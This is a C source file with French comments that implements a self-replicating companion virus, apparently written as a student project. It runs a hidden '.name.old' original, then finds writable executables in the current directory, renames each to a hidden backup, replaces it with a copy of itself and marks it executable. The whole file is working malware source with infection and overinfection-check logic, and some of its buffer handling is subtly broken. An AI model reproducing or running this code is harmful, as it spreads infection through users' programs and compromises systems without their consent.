#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

// permet de couper une string
int str_cut(char *str, int begin, int len)
{
    int l = strlen(str);

    if (len < 0)
        len = l - begin;
    if (begin + len > l)
        len = l - begin;
    memmove(str + begin, str + begin + len, l - len + 1);

    return len;
}

// permet de copier un fichier binaire vers un autre
void copyFile(char *source, char *dest)
{
    FILE *file_src, *file_dest;

    file_src = fopen(source, "rb");
    if (file_src == NULL)
        exit(EXIT_FAILURE);

    file_dest = fopen(dest, "wb");
    if (file_dest == NULL)
        exit(EXIT_FAILURE);

    size_t n, m;
    unsigned char buff[8192];
    do
    {
        n = fread(buff, 1, sizeof buff, file_src);
        if (n)
            m = fwrite(buff, 1, n, file_dest);
        else
            m = 0;
    } while ((n > 0) && (n == m));

    if (m)
        exit(EXIT_FAILURE);

    if (fclose(file_dest))
        exit(EXIT_FAILURE);

    if (fclose(file_src))
        exit(EXIT_FAILURE);
}

int main(int agrc, char const *argv[])
{
    pid_t PID;             // le pid
    DIR *d;                // le dossier
    char *filename;        // une variable utilisée pour stocker le nom du fichier courant
    struct dirent *dir;    // la structure qui représente le dossier
    struct stat file_stat; // la structure qui contient les metadonnées du fichier courant

    // on cherche à exécuter le programme qui à été infecté par le virus
    // on construit le nom du potentiel fichier qui à été infecté
    char *temp = (char *)argv[0];
    str_cut(temp, 0, 2);

    char *toExecute[strlen((char *)temp) + 6];
    sprintf((char *)toExecute, "./.%s.old", (char *)temp);

    // on exécute le programme (puisque le virus représente forcément un programme infecté, il y a forcément un programme qui s'exécute)
    system((char *)toExecute);

    /****************************************************
    ***  On recherche les potentiels fichiers cibles  ***
    ****************************************************/
    // on ouvre le répertoire courant
    d = opendir(".");

    // si on a réussi à ouvrir le répertoire
    if (d)
    {
        // pour chacun des fichiers
        while ((dir = readdir(d)) != NULL)
        {
            // on récupère le nom du fichier courant
            filename = dir->d_name;

            // si on arrive pas à récupérer les métadonnées du fichier courant on quitte le programme
            if (stat(filename, &file_stat) < 0)
                exit(EXIT_FAILURE);

            // si on pointe bien sur un fichier (pas un dossier)
            if (S_ISREG(file_stat.st_mode))
            {
                // on affiche les informations relatives au fichier courant
                printf("Information for %s\n", filename);
                printf("---------------------------\n");

                printf("File Permissions: \t");
                printf((S_ISDIR(file_stat.st_mode)) ? "d" : "-");
                printf((file_stat.st_mode & S_IRUSR) ? "r" : "-");
                printf((file_stat.st_mode & S_IWUSR) ? "w" : "-");
                printf((file_stat.st_mode & S_IXUSR) ? "x" : "-");
                printf((file_stat.st_mode & S_IRGRP) ? "r" : "-");
                printf((file_stat.st_mode & S_IWGRP) ? "w" : "-");
                printf((file_stat.st_mode & S_IXGRP) ? "x" : "-");
                printf((file_stat.st_mode & S_IROTH) ? "r" : "-");
                printf((file_stat.st_mode & S_IWOTH) ? "w" : "-");
                printf((file_stat.st_mode & S_IXOTH) ? "x" : "-");
                printf("\n\n");

                // avec notre mode de propagation de virus, les conditions suivantes permettent d'éviter la surinfection du virus lui-meme (cf rapport)
                if ((file_stat.st_mode & S_IXUSR)                        // vérification que le fichier est bien exécutable par l'utilisateur
                    && (file_stat.st_mode & S_IWUSR)                     // vérification que le fichier possède bien les droits d'écriture
                    && strstr((char *)filename, (char *)".old") == NULL) // vérification que le fichier courant ne soit pas un des fichiers originaux infectés
                {

                    printf("\t-> Found %s as potential target\n", filename);

                    // afin de vérifier si le fichier n'est pas déjà infecté, on essaie d'ouvrir un potentiel fichier caché en .old qui corresponderait au fichier actuel
                    // si on réussi à ouvrir le fichier alors le fichier cible est déjà infecté, sinon on l'infecte
                    FILE *potential_infected_file = NULL;

                    char *infectedFileName[strlen(filename) + 5];
                    sprintf((char *)infectedFileName, ".%s.old", (char *)filename);
                    printf("\t-> Searching for: %s ...\n", (char *)infectedFileName);

                    if ((fopen((char *)infectedFileName, "r")) != NULL)
                    {
                        // on informe l'utilisateur que le fichier ne peut pas etre infecté car il l'a déjà été auparavant (utilisé uniquement pour le debug)
                        printf("\t-> File: %s has already been infected (%s)\n", (char *)filename, (char *)infectedFileName);
                        printf("\t-> %s will not be infected\n", (char *)filename);
                    }
                    else
                    {
                        // si on a pas réussi a ouvrir le fichier alors on l'infecte
                        printf("\t-> Infecting %s as %s\n", (char *)filename, (char *)infectedFileName);

                        // on renome le fichier original
                        rename(filename, (char *)infectedFileName);

                        // une fois le fichier original renomé, on créé un nouveau fichier executable contenant le virus
                        // on récupère la copie courante du virus et la duplique sous le nom original du fichier infecté
                        copyFile((char *)argv[0], (char *)filename);

                        // la commande unix qui sera utilisée afin de rendre le nouveau virus executable
                        char *parmList[] = {"/bin/chmod", "+x", (char *)filename, NULL};
                        // on rend le fichier exécutable
                        if ((PID = fork()) == 0)
                            execvp("chmod", parmList);

                        // on affiche un message qui confirme l'infection du fichier (utilisé uniquement pour le debug)
                        printf("\t-> file: %s as been infected as %s\n", (char *)filename, (char *)infectedFileName);
                    }
                }
                // si le fichier ne remplit pas les conditions d'infection alors on affiche un message à l'utilisateur (utilisé uniquement pour le debug)
                else
                {
                    printf("\t-> %s is not a target\n", (char *)filename);
                }
                printf("---------------------------\n\n");
            }
        }
        // on ferme le pointeur du répertoire courant
        closedir(d);
    }

    return (0);
}